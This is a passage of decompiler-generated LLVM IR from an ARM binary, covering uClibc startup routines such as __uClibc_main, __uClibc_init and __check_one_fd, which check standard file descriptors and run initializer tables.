  %v4_149e4 = load i32, i32* %v3_149e4, align 4
  %v2_149e8 = icmp eq i32 %v4_149e4, 0
  br i1 %v2_149e8, label %bb17, label %bb

bb:                                               ; preds = %dec_label_pc_149e0
  br label %bb17

bb17:                                             ; preds = %dec_label_pc_149e0, %bb
  %v2_149f0 = xor i1 %v2_149e8, true
  call void @__pseudo_cond_branch(i1 %v2_149f0, i32 %v4_149e4)
  %v0_149f8 = load i32, i32* %r5.global-to-local, align 4
  %v2_149f8 = add i32 %v0_149f8, 2008
  %v3_149f8 = inttoptr i32 %v2_149f8 to i32*
  %v4_149f8 = load i32, i32* %v3_149f8, align 4
  %v2_149fc = icmp eq i32 %v4_149f8, 0
  br i1 %v2_149fc, label %bb19, label %bb18

bb18:                                             ; preds = %bb17
  br label %bb19

bb19:                                             ; preds = %bb17, %bb18
  %v2_14a04 = xor i1 %v2_149fc, true
  call void @__pseudo_cond_branch(i1 %v2_14a04, i32 %v4_149f8)
  %v2_14a08 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_14a08, i32* %r4.global-to-local, align 4
  %v1_14a0c = load i32, i32* @r0, align 4
  ret i32 %v1_14a0c

; uselistorder directives
  uselistorder i32 %v1_149d8, { 1, 0 }
  uselistorder i32* %r5.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r4.global-to-local, { 1, 3, 2, 0 }
  uselistorder label %bb19, { 1, 0 }
  uselistorder label %bb17, { 1, 0 }
}

define i32 @__check_one_fd(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v3_14a24 = load i32, i32* @r4, align 4
  %v6_14a24 = load i32, i32* @r5, align 4
  store i32 %arg2, i32* @r5, align 4
  store i32 %arg1, i32* @r4, align 4
  %v2_14a38 = call i32 @__libc_fcntl(i32 %arg1, i32 1)
  %v3_14a40 = icmp eq i32 %v2_14a38, -1
  store i32 ptrtoint (i32* @global_var_21d10.338 to i32), i32* @r3, align 4
  br i1 %v3_14a40, label %dec_label_pc_14a4c, label %dec_label_pc_14a64

dec_label_pc_14a4c:                               ; preds = %entry
  %v0_14a50 = load i32, i32* @r5, align 4
  %v2_14a58 = inttoptr i32 %v0_14a50 to i32*
  %v3_14a58 = call i32 @__libc_open(i32 add (i32 ptrtoint (i32* @global_var_21d10.338 to i32), i32 -33916), i32* %v2_14a58)
  %v1_14a5c = load i32, i32* @r4, align 4
  %v1_14a60 = icmp ne i32 %v3_14a58, %v1_14a5c
  call void @__pseudo_cond_branch(i1 %v1_14a60, i32 ptrtoint (i32* @global_var_13388.530 to i32))
  br label %dec_label_pc_14a64

dec_label_pc_14a64:                               ; preds = %entry, %dec_label_pc_14a4c
  %v1_14a6c = phi i32 [ %v2_14a38, %entry ], [ %v3_14a58, %dec_label_pc_14a4c ]
  store i32 %v3_14a24, i32* @r4, align 4
  store i32 %v6_14a24, i32* @r5, align 4
  ret i32 %v1_14a6c

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_14a64, { 1, 0 }
}

define i32 @__GI___uClibc_init(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_14a78 = load i32, i32* @r4, align 4
  store i32 %v3_14a78, i32* %stack_var_-8, align 4
  store i32 ptrtoint (i32* @global_var_21d10.338 to i32), i32* %r4.global-to-local, align 4
  %v4_14a88 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21d10.338 to i32), i32 148) to i32*), align 4
  %v1_14a8c = inttoptr i32 %v4_14a88 to i32*
  %v2_14a8c = load i32, i32* %v1_14a8c, align 4
  %v2_14a90 = icmp eq i32 %v2_14a8c, 0
  br i1 %v2_14a90, label %dec_label_pc_14a98, label %dec_label_pc_14abc

dec_label_pc_14a98:                               ; preds = %entry
  store i32 4096, i32* %v1_14a8c, align 4
  %v0_14aa0 = call i32 @__pthread_initialize_minimal()
  %v0_14aa8 = load i32, i32* %r4.global-to-local, align 4
  %v2_14aa8 = add i32 %v0_14aa8, -47820
  %v2_14ab0 = icmp eq i32 %v2_14aa8, 0
  br i1 %v2_14ab0, label %bb4, label %bb

bb:                                               ; preds = %dec_label_pc_14a98
  br label %bb4

bb4:                                              ; preds = %dec_label_pc_14a98, %bb
  %v2_14ab8 = xor i1 %v2_14ab0, true
  call void @__pseudo_cond_branch(i1 %v2_14ab8, i32 %v2_14aa8)
  %v2_14abc.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_14abc

dec_label_pc_14abc:                               ; preds = %entry, %bb4
  %v2_14abc = phi i32 [ %v2_14abc.pre, %bb4 ], [ %v3_14a78, %entry ]
  %.0 = phi i32 [ %v0_14aa0, %bb4 ], [ undef, %entry ]
  store i32 %v2_14abc, i32* %r4.global-to-local, align 4
  ret i32 %.0

; uselistorder directives
  uselistorder label %dec_label_pc_14abc, { 1, 0 }
  uselistorder label %bb4, { 1, 0 }
}

define i32 @__uClibc_main(i32 %arg1, i32 %arg2, i32* %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  %tmp = ptrtoint i32* %arg3 to i32
  store i32 %tmp, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %tmp62 = call i32 @__decompiler_undefined_function_0()
  %tmp63 = call i32 @__decompiler_undefined_function_0()
  %tmp64 = call i32 @__decompiler_undefined_function_0()
  %tmp65 = call i32 @__decompiler_undefined_function_0()
  %tmp66 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-400 = alloca i32, align 4
  %stack_var_-120 = alloca i32, align 4
  %stack_var_-416 = alloca i32, align 4
  store i32 53792, i32* %r4.global-to-local, align 4
  %v1_14adc = add i32 %tmp, 4
  store i32 %v1_14adc, i32* %ip.global-to-local, align 4
  %v2_14ae0 = load i32, i32* %arg3, align 4
  store i32 24, i32* %r2.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_21d10.338 to i32), i32* %r4.global-to-local, align 4
  %v3_14aec = mul i32 %arg2, 4
  store i32 %v3_14aec, i32* @r7, align 4
  %v4_14af4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21d10.338 to i32), i32 24) to i32*), align 4
  store i32 %v4_14af4, i32* %r1.global-to-local, align 4
  store i32 56, i32* %r2.global-to-local, align 4
  %v2_14afc = add i32 %v1_14adc, %v3_14aec
  store i32 %v2_14afc, i32* %ip.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_21d10.338 to i32), i32* %stack_var_-416, align 4
  %v4_14b04 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21d10.338 to i32), i32 56) to i32*), align 4
  store i32 %v4_14b04, i32* %r4.global-to-local, align 4
  %v3_14b08 = icmp uge i32 %v2_14afc, %v2_14ae0
  store i1 %v3_14b08, i1* %cpsr_c.global-to-local, align 1
  %v9_14b08 = icmp eq i32 %v2_14afc, %v2_14ae0
  store i1 %v9_14b08, i1* %cpsr_z.global-to-local, align 1
  store i32 %arg7, i32* %r2.global-to-local, align 4
  %v2_14b10 = inttoptr i32 %v4_14b04 to i32*
  store i32 %v2_14afc, i32* %v2_14b10, align 4
  br i1 %v9_14b08, label %bb, label %bb75

bb:                                               ; preds = %entry
  store i32 %tmp, i32* %ip.global-to-local, align 4
  br label %bb75

bb75:                                             ; preds = %entry, %bb
  %v0_14b18 = load i32, i32* %r2.global-to-local, align 4
  %v1_14b18 = load i32, i32* %r1.global-to-local, align 4
  %v2_14b18 = inttoptr i32 %v1_14b18 to i32*
  store i32 %v0_14b18, i32* %v2_14b18, align 4
  %v2_14b1c = load i32, i32* %stack_var_-416, align 4
  store i32 %v2_14b1c, i32* %r5.global-to-local, align 4
  store i32 %arg6, i32* %r1.global-to-local, align 4
  store i32 2008, i32* %r2.global-to-local, align 4
  %v0_14b28 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_14b28, i32* @r6, align 4
  br i1 %v9_14b08, label %bb76, label %.thread52

.thread52:                                        ; preds = %bb75
  %v3_14b3053 = add i32 %v2_14b1c, 2008
  %v4_14b3054 = inttoptr i32 %v3_14b3053 to i32*
  store i32 %arg6, i32* %v4_14b3054, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  br label %bb77

bb76:                                             ; preds = %bb75
  %v1_14b2c = load i32, i32* %ip.global-to-local, align 4
  %v2_14b2c = load i32, i32* @r7, align 4
  %v3_14b2c = add i32 %v2_14b2c, %v1_14b2c
  store i32 %v3_14b2c, i32* %r3.global-to-local, align 4
  %v3_14b3050 = add i32 %v2_14b1c, 2008
  %v4_14b3051 = inttoptr i32 %v3_14b3050 to i32*
  store i32 %arg6, i32* %v4_14b3051, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v1_14b3c = load i32, i32* %r3.global-to-local, align 4
  %v2_14b3c = load i32, i32* %r4.global-to-local, align 4
  %v3_14b3c = inttoptr i32 %v2_14b3c to i32*
  store i32 %v1_14b3c, i32* %v3_14b3c, align 4
  br label %bb77

bb77:                                             ; preds = %.thread52, %bb76
  %v2_14b40 = ptrtoint i32* %stack_var_-120 to i32
  store i32 %v2_14b40, i32* %r0.global-to-local, align 4
  store i32 120, i32* %r2.global-to-local, align 4
  %v3_14b48 = bitcast i32* %stack_var_-120 to i8*
  %v4_14b48 = call i32 @__GI_memset(i8* %v3_14b48, i32 0, i32 120)
  store i32 %v4_14b48, i32* %r0.global-to-local, align 4
  %v0_14b4c = load i32, i32* %r4.global-to-local, align 4
  %v1_14b4c = inttoptr i32 %v0_14b4c to i32*
  %v2_14b4c = load i32, i32* %v1_14b4c, align 4
  br label %dec_label_pc_14b58

dec_label_pc_14b58:                               ; preds = %dec_label_pc_14b58, %bb77
  %storemerge = phi i32 [ %v2_14b4c, %bb77 ], [ %v1_14b64, %dec_label_pc_14b58 ]
  store i32 %storemerge, i32* %r1.global-to-local, align 4
  %v1_14b58 = inttoptr i32 %storemerge to i32*
  %v2_14b58 = load i32, i32* %v1_14b58, align 4
  store i32 %v2_14b58, i32* %r3.global-to-local, align 4
  %v2_14b5c = icmp eq i32 %v2_14b58, 0
  %v1_14b64 = add i32 %storemerge, 4
  br i1 %v2_14b5c, label %dec_label_pc_14b64, label %dec_label_pc_14b58

dec_label_pc_14b64:                               ; preds = %dec_label_pc_14b58
  store i32 %v1_14b64, i32* @r4, align 4
  store i32 %v2_14b40, i32* @r5, align 4
  %v1_14b8830 = inttoptr i32 %v1_14b64 to i32*
  %v2_14b8831 = load i32, i32* %v1_14b8830, align 4
  store i32 %v2_14b8831, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_14b8c33 = icmp eq i32 %v2_14b8831, 0
  store i1 %v2_14b8c33, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14b8c33, label %dec_label_pc_14b94, label %dec_label_pc_14b70

dec_label_pc_14b70:                               ; preds = %dec_label_pc_14b64, %dec_label_pc_14b88
  %v4_14b78 = phi i32 [ %v1_14b84, %dec_label_pc_14b88 ], [ %v1_14b64, %dec_label_pc_14b64 ]
  %v5_14b74 = phi i32 [ %v2_14b88, %dec_label_pc_14b88 ], [ %v2_14b8831, %dec_label_pc_14b64 ]
  %v2_14b70 = icmp ugt i32 %v5_14b74, 13
  store i1 %v2_14b70, i1* %cpsr_c.global-to-local, align 1
  %v7_14b70 = icmp eq i32 %v5_14b74, 14
  store i1 %v7_14b70, i1* %cpsr_z.global-to-local, align 1
  %v2_14b74 = xor i1 %v2_14b70, true
  %v3_14b74 = or i1 %v7_14b70, %v2_14b74
  br i1 %v3_14b74, label %bb78, label %bb79

bb78:                                             ; preds = %dec_label_pc_14b70
  %v4_14b74 = load i32, i32* @r5, align 4
  %v6_14b74 = and i32 %v5_14b74, 536870912
  %v7_14b74 = icmp ne i32 %v6_14b74, 0
  store i1 %v7_14b74, i1* %cpsr_c.global-to-local, align 1
  %v8_14b74 = mul i32 %v5_14b74, 8
  %v9_14b74 = add i32 %v4_14b74, %v8_14b74
  store i32 %v9_14b74, i32* %r0.global-to-local, align 4
  br label %bb79

bb79:                                             ; preds = %dec_label_pc_14b70, %bb78
  %v1_14b80 = phi i1 [ %v2_14b70, %dec_label_pc_14b70 ], [ %v7_14b74, %bb78 ]
  %v2_14b78 = xor i1 %v1_14b80, true
  %v3_14b78 = or i1 %v7_14b70, %v2_14b78
  br i1 %v3_14b78, label %bb80, label %dec_label_pc_14b88

bb80:                                             ; preds = %bb79
  store i32 %v4_14b78, i32* %r1.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_14b88

dec_label_pc_14b88:                               ; preds = %bb79, %bb80
  call void @__pseudo_cond_branch(i1 %v3_14b78, i32 ptrtoint (i32* @global_var_11740.538 to i32))
  %v0_14b84 = load i32, i32* @r4, align 4
  %v1_14b84 = add i32 %v0_14b84, 8
  store i32 %v1_14b84, i32* @r4, align 4
  %v1_14b88 = inttoptr i32 %v1_14b84 to i32*
  %v2_14b88 = load i32, i32* %v1_14b88, align 4
  store i32 %v2_14b88, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_14b8c = icmp eq i32 %v2_14b88, 0
  store i1 %v2_14b8c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14b8c, label %dec_label_pc_14b94, label %dec_label_pc_14b70

dec_label_pc_14b94:                               ; preds = %dec_label_pc_14b88, %dec_label_pc_14b64
  store i32 %v2_14b40, i32* %r0.global-to-local, align 4
  %v1_14b98 = call i32 @_dl_aux_init(i32 %v2_14b40)
  store i32 %v1_14b98, i32* %r0.global-to-local, align 4
  %v1_14b9c = call i32 @__GI___uClibc_init(i32 %v1_14b98)
  store i32 %v1_14b9c, i32* @r0, align 4
  store i32 148, i32* %r3.global-to-local, align 4
  %v2_14ba4 = load i32, i32* %stack_var_-416, align 4
  store i32 %v2_14ba4, i32* @lr, align 4
  store i32 %tmp66, i32* @r2, align 4
  %v2_14bac = add i32 %v2_14ba4, 148
  %v3_14bac = inttoptr i32 %v2_14bac to i32*
  %v4_14bac = load i32, i32* %v3_14bac, align 4
  store i32 %v4_14bac, i32* %r1.global-to-local, align 4
  store i32 %tmp65, i32* @r3, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_14bb4 = icmp eq i32 %tmp66, 0
  store i1 %v2_14bb4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14bb4, label %bb81, label %bb82

bb81:                                             ; preds = %dec_label_pc_14b94
  store i32 4096, i32* @r2, align 4
  br label %bb82

bb82:                                             ; preds = %dec_label_pc_14b94, %bb81
  %v0_14bc0 = phi i32 [ %tmp66, %dec_label_pc_14b94 ], [ 4096, %bb81 ]
  %v3_14bbc = icmp eq i32 %tmp65, -1
  store i1 %v3_14bbc, i1* %cpsr_c.global-to-local, align 1
  %v8_14bbc = icmp eq i32 %tmp65, -1
  store i1 %v8_14bbc, i1* %cpsr_z.global-to-local, align 1
  %v2_14bc0 = inttoptr i32 %v4_14bac to i32*
  store i32 %v0_14bc0, i32* %v2_14bc0, align 4
  br i1 %v3_14bbc, label %dec_label_pc_14bc8, label %dec_label_pc_14bf0

dec_label_pc_14bc8:                               ; preds = %bb82
  %v0_14bc8 = call i32 @getuid()
  store i32 %v0_14bc8, i32* @r0, align 4
  store i32 %v0_14bc8, i32* %r4.global-to-local, align 4
  %v0_14bd0 = call i32 @geteuid()
  store i32 %v0_14bd0, i32* @r0, align 4
  %v3_14bd4 = icmp uge i32 %v0_14bc8, %v0_14bd0
  store i1 %v3_14bd4, i1* %cpsr_c.global-to-local, align 1
  %v9_14bd4 = icmp eq i32 %v0_14bc8, %v0_14bd0
  store i1 %v9_14bd4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_14bd4, label %dec_label_pc_14bdc, label %dec_label_pc_14c18

dec_label_pc_14bdc:                               ; preds = %dec_label_pc_14bc8
  %v1_14bdc = call i32 @getgid(i32 %v0_14bd0)
  store i32 %v1_14bdc, i32* @r0, align 4
  store i32 %v1_14bdc, i32* %r4.global-to-local, align 4
  %v0_14be4 = call i32 @getegid()
  store i32 %v0_14be4, i32* %r0.global-to-local, align 4
  %v3_14be8 = icmp uge i32 %v1_14bdc, %v0_14be4
  store i1 %v3_14be8, i1* %cpsr_c.global-to-local, align 1
  %v9_14be8 = icmp eq i32 %v1_14bdc, %v0_14be4
  store i1 %v9_14be8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_14be8, label %dec_label_pc_14bf0, label %dec_label_pc_14c18

dec_label_pc_14bf0:                               ; preds = %dec_label_pc_14bdc, %bb82
  store i32 %tmp65, i32* @r2, align 4
  store i1 %v3_14bbc, i1* %cpsr_c.global-to-local, align 1
  store i1 %v8_14bbc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_14bbc, label %dec_label_pc_14c40, label %dec_label_pc_14bfc

dec_label_pc_14bfc:                               ; preds = %dec_label_pc_14bf0
  store i32 %tmp64, i32* @r3, align 4
  %v3_14c00 = icmp uge i32 %tmp65, %tmp64
  store i1 %v3_14c00, i1* %cpsr_c.global-to-local, align 1
  %v9_14c00 = icmp eq i32 %tmp65, %tmp64
  store i1 %v9_14c00, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_14c00, label %dec_label_pc_14c08, label %dec_label_pc_14c18

dec_label_pc_14c08:                               ; preds = %dec_label_pc_14bfc
  store i32 %tmp63, i32* @r2, align 4
  store i32 %tmp62, i32* @r3, align 4
  %v3_14c10 = icmp uge i32 %tmp63, %tmp62
  store i1 %v3_14c10, i1* %cpsr_c.global-to-local, align 1
  %v9_14c10 = icmp eq i32 %tmp63, %tmp62
  store i1 %v9_14c10, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_14c10, label %dec_label_pc_14c40, label %dec_label_pc_14c18

dec_label_pc_14c18:                               ; preds = %dec_label_pc_14bfc, %dec_label_pc_14bdc, %dec_label_pc_14bc8, %dec_label_pc_14c08
  store i32 32770, i32* @r4, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 32768, i32* %r1.global-to-local, align 4
  %v2_14c24 = call i32 @__check_one_fd(i32 0, i32 32768)
  store i32 1, i32* %r0.global-to-local, align 4
  %v0_14c2c = load i32, i32* @r4, align 4
  store i32 %v0_14c2c, i32* %r1.global-to-local, align 4
  %v2_14c30 = call i32 @__check_one_fd(i32 1, i32 %v0_14c2c)
  %v0_14c34 = load i32, i32* @r4, align 4
  store i32 %v0_14c34, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v2_14c3c = call i32 @__check_one_fd(i32 2, i32 %v0_14c34)
  store i32 %v2_14c3c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14c40

dec_label_pc_14c40:                               ; preds = %dec_label_pc_14c08, %dec_label_pc_14bf0, %dec_label_pc_14c18
  store i32 %tmp, i32* %r0.global-to-local, align 4
  store i32 260, i32* %r3.global-to-local, align 4
  %v2_14c48 = load i32, i32* %arg3, align 4
  store i32 %v2_14c48, i32* %r2.global-to-local, align 4
  %v2_14c4c = load i32, i32* %stack_var_-416, align 4
  store i32 %v2_14c4c, i32* %r1.global-to-local, align 4
  %v3_14c50 = add i32 %v2_14c4c, 260
  %v4_14c50 = inttoptr i32 %v3_14c50 to i32*
  store i32 %v2_14c48, i32* %v4_14c50, align 4
  %v0_14c54 = load i32, i32* %r0.global-to-local, align 4
  %v1_14c54 = inttoptr i32 %v0_14c54 to i32*
  %v2_14c54 = load i32, i32* %v1_14c54, align 4
  store i32 %v2_14c54, i32* @r4, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_14c58 = icmp eq i32 %v2_14c54, 0
  store i1 %v2_14c58, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14c58, label %bb84, label %dec_label_pc_14c60

dec_label_pc_14c60:                               ; preds = %dec_label_pc_14c40
  store i32 164, i32* %r3.global-to-local, align 4
  %v0_14c64 = load i32, i32* %r1.global-to-local, align 4
  %v2_14c64 = add i32 %v0_14c64, 164
  %v3_14c64 = inttoptr i32 %v2_14c64 to i32*
  %v4_14c64 = load i32, i32* %v3_14c64, align 4
  store i32 %v4_14c64, i32* %r3.global-to-local, align 4
  %v2_14c68 = inttoptr i32 %v4_14c64 to i32*
  store i32 %v2_14c54, i32* %v2_14c68, align 4
  store i32 47, i32* %r1.global-to-local, align 4
  %v0_14c70 = load i32, i32* %r0.global-to-local, align 4
  %v1_14c70 = inttoptr i32 %v0_14c70 to i32*
  %v2_14c70 = load i32, i32* %v1_14c70, align 4
  store i32 %v2_14c70, i32* %r0.global-to-local, align 4
  %v4_14c74 = call i32 @__GI_strrchr(i32 %v2_14c70, i32 47, i32 %v2_14c48, i32 %v4_14c64)
  store i32 %v4_14c74, i32* %r0.global-to-local, align 4
  store i32 96, i32* %r3.global-to-local, align 4
  %v2_14c7c = load i32, i32* %stack_var_-416, align 4
  store i32 %v2_14c7c, i32* %r5.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_14c80 = icmp eq i32 %v4_14c74, 0
  store i1 %v2_14c80, i1* %cpsr_z.global-to-local, align 1
  %v2_14c84 = add i32 %v2_14c7c, 96
  %v3_14c84 = inttoptr i32 %v2_14c84 to i32*
  %v4_14c84 = load i32, i32* %v3_14c84, align 4
  store i32 %v4_14c84, i32* %r2.global-to-local, align 4
  br i1 %v2_14c80, label %.thread57, label %bb83

.thread57:                                        ; preds = %dec_label_pc_14c60
  %v2_14c8c58 = inttoptr i32 %v4_14c84 to i32*
  store i32 0, i32* %v2_14c8c58, align 4
  br label %bb84

bb83:                                             ; preds = %dec_label_pc_14c60
  %v2_14c88 = add i32 %v4_14c74, 1
  store i32 %v2_14c88, i32* %r3.global-to-local, align 4
  %v2_14c8c = inttoptr i32 %v4_14c84 to i32*
  store i32 %v4_14c74, i32* %v2_14c8c, align 4
  %v1_14c90 = load i32, i32* %r3.global-to-local, align 4
  %v2_14c90 = load i32, i32* %r2.global-to-local, align 4
  %v3_14c90 = inttoptr i32 %v2_14c90 to i32*
  store i32 %v1_14c90, i32* %v3_14c90, align 4
  br label %bb84

bb84:                                             ; preds = %.thread57, %bb83, %dec_label_pc_14c40
  %v2_14ca0 = load i32, i32* %stack_var_-416, align 4
  store i32 %v2_14ca0, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r7.global-to-local, align 4
  %v2_14cac = add i32 %v2_14ca0, -12
  store i32 %v2_14cac, i32* %r5.global-to-local, align 4
  store i32 2004, i32* %r3.global-to-local, align 4
  store i32 %arg5, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v3_14cbc = add i32 %v2_14ca0, 2004
  %v4_14cbc = inttoptr i32 %v3_14cbc to i32*
  store i32 %arg5, i32* %v4_14cbc, align 4
  %v0_14cd418 = load i32, i32* %r4.global-to-local, align 4
  %v1_14cd419 = load i32, i32* %r7.global-to-local, align 4
  %v3_14cd421 = icmp uge i32 %v0_14cd418, %v1_14cd419
  store i1 %v3_14cd421, i1* %cpsr_c.global-to-local, align 1
  %v9_14cd427 = icmp eq i32 %v0_14cd418, %v1_14cd419
  store i1 %v9_14cd427, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_14cd421, label %dec_label_pc_14d08.lr.ph, label %dec_label_pc_14cc4

dec_label_pc_14cc4:                               ; preds = %bb84, %dec_label_pc_14cc4
  %v1_14cc4 = phi i32 [ %v1_14cd0, %dec_label_pc_14cc4 ], [ %v0_14cd418, %bb84 ]
  %v0_14cc4 = load i32, i32* %r5.global-to-local, align 4
  %v2_14cc4 = and i32 %v1_14cc4, 1073741824
  %v3_14cc4 = icmp ne i32 %v2_14cc4, 0
  store i1 %v3_14cc4, i1* %cpsr_c.global-to-local, align 1
  %v4_14cc4 = mul i32 %v1_14cc4, 4
  %v5_14cc4 = add i32 %v4_14cc4, %v0_14cc4
  %v6_14cc4 = inttoptr i32 %v5_14cc4 to i32*
  %v7_14cc4 = load i32, i32* %v6_14cc4, align 4
  store i32 %v7_14cc4, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v7_14cc4)
  %v0_14cd0 = load i32, i32* %r4.global-to-local, align 4
  %v1_14cd0 = add i32 %v0_14cd0, 1
  store i32 %v1_14cd0, i32* %r4.global-to-local, align 4
  %v1_14cd4 = load i32, i32* %r7.global-to-local, align 4
  %v3_14cd4 = icmp uge i32 %v1_14cd0, %v1_14cd4
  store i1 %v3_14cd4, i1* %cpsr_c.global-to-local, align 1
  %v9_14cd4 = icmp eq i32 %v1_14cd0, %v1_14cd4
  store i1 %v9_14cd4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_14cd4, label %dec_label_pc_14d08.lr.ph, label %dec_label_pc_14cc4

dec_label_pc_14d08.lr.ph:                         ; preds = %dec_label_pc_14cc4, %bb84
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_14cdc = icmp eq i32 %v0_14b28, 0
  store i1 %v2_14cdc, i1* %cpsr_z.global-to-local, align 1
  %v2_14ce4 = xor i1 %v2_14cdc, true
  call void @__pseudo_cond_branch(i1 %v2_14ce4, i32 %v0_14b28)
  store i32 -12, i32* %r2.global-to-local, align 4
  %v2_14cf0 = load i32, i32* %stack_var_-416, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  store i32 1, i32* @r7, align 4
  %v2_14cfc = add i32 %v2_14cf0, -12
  store i32 %v2_14cfc, i32* @r5, align 4
  store i32 0, i32* @r4, align 4
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_14d08

dec_label_pc_14d08:                               ; preds = %dec_label_pc_14d08.dec_label_pc_14d08_crit_edge, %dec_label_pc_14d08.lr.ph
  %v1_14d08 = phi i32 [ %v1_14d14, %dec_label_pc_14d08.dec_label_pc_14d08_crit_edge ], [ 0, %dec_label_pc_14d08.lr.ph ]
  %v0_14d08 = phi i32 [ %v0_14d08.pre, %dec_label_pc_14d08.dec_label_pc_14d08_crit_edge ], [ %v2_14cfc, %dec_label_pc_14d08.lr.ph ]
  %v2_14d08 = and i32 %v1_14d08, 1073741824
  %v3_14d08 = icmp ne i32 %v2_14d08, 0
  store i1 %v3_14d08, i1* %cpsr_c.global-to-local, align 1
  %v4_14d08 = mul i32 %v1_14d08, 4
  %v5_14d08 = add i32 %v4_14d08, %v0_14d08
  %v6_14d08 = inttoptr i32 %v5_14d08 to i32*
  %v7_14d08 = load i32, i32* %v6_14d08, align 4
  store i32 %v7_14d08, i32* %ip.global-to-local, align 4
  store i32 85268, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v7_14d08)
  %v0_14d14 = load i32, i32* @r4, align 4
  %v1_14d14 = add i32 %v0_14d14, 1
  store i32 %v1_14d14, i32* @r4, align 4
  %v1_14d18 = load i32, i32* @r7, align 4
  %v3_14d18 = icmp uge i32 %v1_14d14, %v1_14d18
  store i1 %v3_14d18, i1* %cpsr_c.global-to-local, align 1
  %v9_14d18 = icmp eq i32 %v1_14d14, %v1_14d18
  store i1 %v9_14d18, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_14d18, label %dec_label_pc_14d20, label %dec_label_pc_14d08.dec_label_pc_14d08_crit_edge

dec_label_pc_14d08.dec_label_pc_14d08_crit_edge:  ; preds = %dec_label_pc_14d08
  %v0_14d08.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_14d08

dec_label_pc_14d20:                               ; preds = %dec_label_pc_14d08
  %v2_14d24.pre = load i32, i32* %stack_var_-416, align 4
  store i32 %v2_14d24.pre, i32* %r0.global-to-local, align 4
  %v2_14d28 = add i32 %v2_14d24.pre, -67112
  store i32 %v2_14d28, i32* %r2.global-to-local, align 4
  store i32 %v2_14d28, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_14d30 = icmp eq i32 %v2_14d28, 0
  store i1 %v2_14d30, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14d30, label %dec_label_pc_14d48, label %dec_label_pc_14d38

dec_label_pc_14d38:                               ; preds = %dec_label_pc_14d20
  store i32 85312, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v2_14d28)
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_14d44 = load i32, i32* %r0.global-to-local, align 4
  %v2_14d44 = inttoptr i32 %v1_14d44 to i32*
  store i32 0, i32* %v2_14d44, align 4
  %v2_14d4c.pre = load i32, i32* %stack_var_-416, align 4
  br label %dec_label_pc_14d48

dec_label_pc_14d48:                               ; preds = %dec_label_pc_14d20, %dec_label_pc_14d38
  %v2_14d4c = phi i32 [ %v2_14d24.pre, %dec_label_pc_14d20 ], [ %v2_14d4c.pre, %dec_label_pc_14d38 ]
  store i32 128, i32* %r3.global-to-local, align 4
  store i32 %v2_14d4c, i32* %r1.global-to-local, align 4
  %v2_14d50 = add i32 %v2_14d4c, 128
  %v3_14d50 = inttoptr i32 %v2_14d50 to i32*
  %v4_14d50 = load i32, i32* %v3_14d50, align 4
  store i32 %v4_14d50, i32* %r2.global-to-local, align 4
